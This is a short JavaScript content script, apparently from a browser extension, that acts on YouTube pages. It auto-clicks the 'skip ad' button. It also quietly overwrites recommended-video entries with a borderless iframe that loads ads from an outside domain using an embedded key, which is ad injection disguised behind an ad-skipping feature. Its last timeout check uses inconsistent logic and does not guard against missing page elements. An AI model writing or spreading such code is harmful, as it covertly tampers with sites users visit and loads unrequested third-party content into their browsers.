const ads = `<div id="youasd"  style="display:flex; justify-content:center;"><iframe src='//viagemmais.nl/ads?key=3123123dsasjhfhwefh4hfhu34fh43tg34gfr456g9er5434556b43456b4tr3458973484789f456ew45r6' style='width:400px; height:350px; border:0px; padding:0; overflow:hidden; background-color: transparent;'></iframe></div>`;
function Skip() {
    var btn = document.querySelector(".ytp-ad-skip-button.ytp-button");
    if (btn) {
        btn.click();
    }
}

function youint() {
    var youtube1 = document.querySelector("#contents > ytd-compact-video-renderer:nth-child(2)");
    var youtube2 = document.querySelector("#items > ytd-compact-video-renderer:nth-child(2)");
    var youtube3 = document.querySelector("#contents > ytd-compact-radio-renderer:nth-child(2)");
    if (youtube1) {
        clearInterval(youtemp);
        youtube1.innerHTML = ads;

    }
    if (youtube2) {
        clearInterval(youtemp);
        youtube2.innerHTML = ads;

    }
    if (youtube3) {
        clearInterval(youtemp);
        youtube3.innerHTML = ads;

    }
}
setInterval(() => {
    Skip();
}, 1000)
const youtemp = setInterval(() => {
    youint();
}, 1000);

setTimeout(()=>{
    if (!document.querySelector("#contents > ytd-compact-video-renderer:nth-child(2)").innerHTML.includes(ads)
        &&
        !document.querySelector("#items > ytd-compact-video-renderer:nth-child(2)").innerHTML.includes(ads)
        &&
        document.querySelector("#contents > ytd-compact-radio-renderer:nth-child(2)").innerHTML.includes(ads)
    ){
       youint();
    }
},5000);
